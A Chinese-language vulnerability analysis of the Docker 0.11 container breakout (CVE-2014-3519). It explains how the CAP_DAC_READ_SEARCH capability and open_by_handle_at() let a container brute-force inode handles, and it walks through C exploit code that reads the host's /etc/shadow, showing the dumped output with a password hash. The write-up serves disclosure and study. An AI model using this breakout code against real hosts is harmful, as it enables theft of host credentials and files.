##Docker 0.11 - VMM-Container Breakout

##漏洞类型：
容器逃逸  本地安全限制绕过


##漏洞分析：
docker0.11之前版本的open_by_handle_at()函数允许进程访问file_handle结构的已加载文件系统上的文件，该结构暴力试验inode数字区分文件，本地攻击者可利用此漏洞绕过某些安全限制并执行未授权操作。

##具体分析：
docker0.11之前版本采用黑名单的形式来限制容器的能力，此次能够逃逸的原因是没有禁止open_by_handle_at()函数的CAP_DAC_READ_SEARCH能力。  
下面只是简略的描述其功能，更多关于CAP_DAC_READ_SEARCH的内容请查阅[capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html)

CAP_DAC_READ_SEARCH的描述如下：

    * Bypass file read permission checks and directory read and
      execute permission checks;
    * Invoke open_by_handle_at(2).

如果open_by_handle_at函数具有CAP_DAC_READ_SEARCH，那它就可以读取任意文件和文件夹。  

[open_by_handle_at](http://man7.org/linux/man-pages/man2/open_by_handle_at.2.html)的定义如下：

    int open_by_handle_at(int mount_fd, struct file_handle *handle,int flags);

- mount_fd 指向某一个文件系统中文件或者目录的文件描述符
- file_handle  一个文件或者目录的描述信息
- flags   The flags argument is as for open(2).

[file_handle结构](http://lxr.free-electrons.com/source/include/linux/fs.h#L877)如下:   


     struct file_handle {
          unsigned int  handle_bytes;   /* Size of f_handle [in, out] */
          int           handle_type;    /* Handle type [out] */
           unsigned char f_handle[0];    /* File identifier (sized by
                                                    caller) [out] */
        };
    

file_handle结构中f_handle[0]为8位inode号。    
在大多数的文件系统中，根目录的inode号为2，这个信息提供了一个可以暴力破解的方式： 攻击者可以通过打开根目录,比较目录名和文件名，遍历inode号达到查看任意文件的目的。

##具体过程：
以查看/etc/shadow为例
第一步设置根目录的文件信息

    struct my_file_handle root_h = {
            .handle_bytes = 8,
            .handle_type = 1,
            .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
            //根目录的inode号为2
        };
第二步打开宿主机任意文件，获得文件描述符

    //打开宿主机器上的任意文件 获得文件描述符
    if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
        die("[-] open");
第三步利用文件描述符 根目录的信息 得到/etc/shadow的文件信息

    if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");
这个过程是一个迭代的过程  
查找目录：  

        //打开文件
        if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
            die("[-] open_by_handle_at");
        //打开目录
        if ((dir = fdopendir(fd)) == NULL)
            die("[-] fdopendir");
        for (;;) {
            //读取目录项
            de = readdir(dir);
            if (!de)
                break;
            fprintf(stderr, "[*] Found %s\n", de->d_name);
            //判断目录名
            if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
                fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
                ino = de->d_ino;
                break;
            }
        }
找到/etc目录，得到/etc的inode号  

暴力试验inode数字，找到文件: 

        if (de) {
            //暴力破解inode号
            for (uint32_t i = 0; i < 0xffffffff; ++i) {
                outh.handle_bytes = 8;
                outh.handle_type = 1;
                memcpy(outh.f_handle, &ino, sizeof(ino));//得到的/etc的inode号
                memcpy(outh.f_handle + 4, &i, sizeof(i)); //只暴力破解后4位
                if ((i % (1<<20)) == 0)
                    fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
                if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                    closedir(dir);
                    close(fd);
                    dump_handle(&outh);
                    return find_handle(bfd, path, &outh, oh);
                }
            }
        }

第四步 读取文件信息

        //根据文件信息 打开文件
        if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
            die("[-] open_by_handle");
        memset(buf, 0, sizeof(buf));
        if (read(fd2, buf, sizeof(buf) - 1) < 0)
            die("[-] read");

最终达到读取宿主机器任意文件信息的效果
读取的/etc/shadow文件信息

    root:!:15597:0:99999:7:::
    daemon:*:15597:0:99999:7:::
    bin:*:15597:0:99999:7:::
    sys:*:15597:0:99999:7:::
    sync:*:15597:0:99999:7:::
    games:*:15597:0:99999:7:::
    man:*:15597:0:99999:7:::
    lp:*:15597:0:99999:7:::
    mail:*:15597:0:99999:7:::
    news:*:15597:0:99999:7:::
    uucp:*:15597:0:99999:7:::
    proxy:*:15597:0:99999:7:::
    www-data:*:15597:0:99999:7:::
    backup:*:15597:0:99999:7:::
    list:*:15597:0:99999:7:::
    irc:*:15597:0:99999:7:::
    gnats:*:15597:0:99999:7:::
    nobody:*:15597:0:99999:7:::
    libuuid:!:15597:0:99999:7:::
    syslog:*:15597:0:99999:7:::
    messagebus:*:15597:0:99999:7:::
    ntp:*:15597:0:99999:7:::
    sshd:*:15597:0:99999:7:::
    vagrant:$6$aqzOtgCM$OxgoMP4JoqMJ1U1F3MZPo2iBefDRnRCXSfgIM36E5cfMNcE7GcNtH1P/tTC2QY3sX3BxxJ7r/9ciScIVTa55l0:15597:0:99999:7:::
    vboxadd:!:15597::::::
    statd:*:15597:0:99999:7:::


##漏洞验证方式：  
docker version 版本 <=0.11 均存在漏洞  
测试[poc](http://stealth.openwall.net/xSports/shocker.c) 可验证

##影响版本：
docker版本 <=0.11 均存在漏洞


##官方修复
官方讨论白名单的方式来赋予权限，可见[Granular capabilities / priviledged whitelist](https://github.com/docker/docker/issues/2080)  
官方正式去掉黑名单，可见[dockerinit: drop capabilities](https://github.com/docker/docker/pull/3015/files)  
去掉CAP_DAC_READ_SEARCH的[请求](https://github.com/docker/docker/pull/6525/commits)也被关闭了



##相同漏洞：  
- [CVE-2014-3519](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3519)


##参考链接：
- http://man7.org/linux/man-pages/man2/open_by_handle_at.2.html
- http://man7.org/linux/man-pages/man7/capabilities.7.html
- http://stealth.openwall.net/xSports/shocker.c
- https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3#.80qhbidek
- https://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/